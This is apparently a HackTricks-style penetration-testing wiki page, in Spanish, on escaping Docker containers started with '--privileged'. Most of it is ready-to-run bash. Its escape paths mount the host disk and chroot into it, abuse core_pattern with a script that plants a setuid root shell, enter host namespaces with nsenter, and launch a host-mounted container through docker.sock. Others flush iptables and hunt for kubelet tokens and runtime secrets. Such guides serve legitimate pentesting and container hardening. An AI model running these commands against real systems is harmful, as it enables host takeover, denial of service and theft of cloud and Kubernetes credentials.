# Escaping From `--privileged` Containers

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Un container iniciado con `--privileged` no es lo mismo que un container normal con uno o dos permisos adicionales. En la práctica, `--privileged` elimina o debilita varias de las protecciones predeterminadas del runtime que normalmente mantienen la carga de trabajo alejada de recursos peligrosos del host. El efecto exacto aún depende del runtime y del host, pero en Docker el resultado habitual es:

- se conceden todas las capabilities
- se levantan las restricciones del cgroup de dispositivos
- muchos filesystems del kernel dejan de montarse como solo lectura
- desaparecen las rutas predeterminadas enmascaradas de procfs
- se deshabilita el filtrado de seccomp
- se deshabilita el confinamiento de AppArmor
- se deshabilita el aislamiento de SELinux o se reemplaza por una etiqueta mucho más amplia

La consecuencia importante es que un container privileged normalmente **no** necesita un exploit sutil del kernel. En muchos casos puede interactuar directamente con dispositivos del host, filesystems del kernel accesibles desde el host o interfaces del runtime, y después pivotar a un shell del host.

## What `--privileged` Does Not Automatically Change

`--privileged` **no** se une automáticamente a los namespaces PID, de red, IPC o UTS del host. Un container privileged aún puede tener namespaces privados. Esto significa que algunas cadenas de escape requieren una condición adicional, como:

- un bind mount del host
- compartir los PID del host
- networking del host
- dispositivos del host visibles
- interfaces proc/sys con permisos de escritura

Estas condiciones suelen ser fáciles de cumplir en misconfigurations reales, pero conceptualmente son independientes de `--privileged`.

## Escape Paths

### 1. Mount The Host Disk Through Exposed Devices

Un container privileged normalmente ve muchos más device nodes bajo `/dev`. Si el block device del host es visible, el escape más sencillo consiste en montarlo y ejecutar `chroot` en el filesystem del host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Si la partición raíz no es evidente, enumera primero la disposición de los bloques:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Si el enfoque práctico es colocar un helper setuid en un montaje del host con permisos de escritura en lugar de usar `chroot`, recuerda que no todos los sistemas de archivos respetan el bit setuid. Una comprobación rápida de esta capacidad desde el host es:
```bash
mount | grep -v "nosuid"
```
Esto es útil porque las rutas escribibles bajo sistemas de archivos `nosuid` son mucho menos interesantes para los flujos de trabajo clásicos de "depositar una shell setuid y ejecutarla posteriormente".

Las protecciones debilitadas que se aprovechan aquí son:

- exposición completa de dispositivos
- capabilities amplias, especialmente `CAP_SYS_ADMIN`

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Montar o reutilizar un bind mount del host y usar `chroot`

Si el sistema de archivos raíz del host ya está montado dentro del contenedor, o si el contenedor puede crear los mounts necesarios porque es privileged, normalmente basta con un `chroot` para obtener una shell del host:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Si no existe un bind mount de la raíz del host, pero el almacenamiento del host es accesible, crea uno:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Este path abusa de:

- restricciones de mount debilitadas
- capabilities completas
- falta de confinamiento MAC

Páginas relacionadas:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Abusar de `/proc/sys` o `/sys` con permisos de escritura

Una de las principales consecuencias de `--privileged` es que las protecciones de procfs y sysfs se vuelven mucho más débiles. Esto puede exponer interfaces del kernel orientadas al host que normalmente están ocultas o montadas como de solo lectura.

Un ejemplo clásico es `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Otros paths de alto valor incluyen:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Este path abusa de:

- rutas masked ausentes
- rutas del sistema de solo lectura ausentes

Páginas relacionadas:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Usar Full Capabilities Para Un Escape Basado En Mount O Namespace

Un contenedor privilegiado obtiene las capabilities que normalmente se eliminan de los contenedores estándar, incluidas `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` y muchas otras. Esto suele ser suficiente para convertir un foothold local en un host escape en cuanto existe otra superficie expuesta.

Un ejemplo sencillo consiste en montar filesystems adicionales y usar la entrada en namespaces:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Si el PID del host también se comparte, el paso se vuelve aún más corto:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Esta ruta abusa de:

- el conjunto de capacidades privilegiadas predeterminado
- el uso compartido opcional del PID del host

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape a través de Runtime Sockets

Un contenedor privilegiado suele terminar teniendo visible el estado o los sockets del runtime del host. Si se puede acceder a un socket de Docker, containerd o CRI-O, el enfoque más sencillo suele ser utilizar la API del runtime para iniciar un segundo contenedor con acceso al host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Para containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Esta vía abusa de:

- exposición privilegiada del runtime
- bind mounts del host creados mediante el propio runtime

Páginas relacionadas:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Eliminar los efectos secundarios del aislamiento de red

`--privileged` no se une por sí solo al namespace de red del host, pero si el contenedor también tiene `--network=host` u otro acceso a la red del host, toda la pila de red puede modificarse:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Esto no siempre proporciona un shell directo en el host, pero puede permitir una denegación de servicio, la interceptación de tráfico o el acceso a servicios de gestión accesibles únicamente desde loopback.

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Leer secretos del host y el estado del runtime

Incluso cuando un escape de shell limpio no es inmediato, los contenedores privilegiados suelen tener acceso suficiente para leer secretos del host, el estado de kubelet, los metadatos del runtime y los sistemas de archivos de contenedores vecinos:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Si `/var` está montado desde el host o los directorios del runtime son visibles, esto puede ser suficiente para realizar movimiento lateral o robar credenciales de cloud/Kubernetes incluso antes de obtener una shell del host.

Páginas relacionadas:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Comprobaciones

El propósito de los siguientes comandos es confirmar qué familias de escape de contenedores privilegiados son viables de inmediato.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Qué resulta interesante aquí:

- un conjunto completo de capabilities, especialmente `CAP_SYS_ADMIN`
- exposición escribible de proc/sys
- dispositivos del host visibles
- ausencia de seccomp y confinamiento MAC
- sockets del runtime o bind mounts de la raíz del host

Cualquiera de estos elementos puede ser suficiente para post-exploitation. Varios juntos normalmente significan que el container está, funcionalmente, a uno o dos comandos de comprometer el host.

## Páginas relacionadas

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
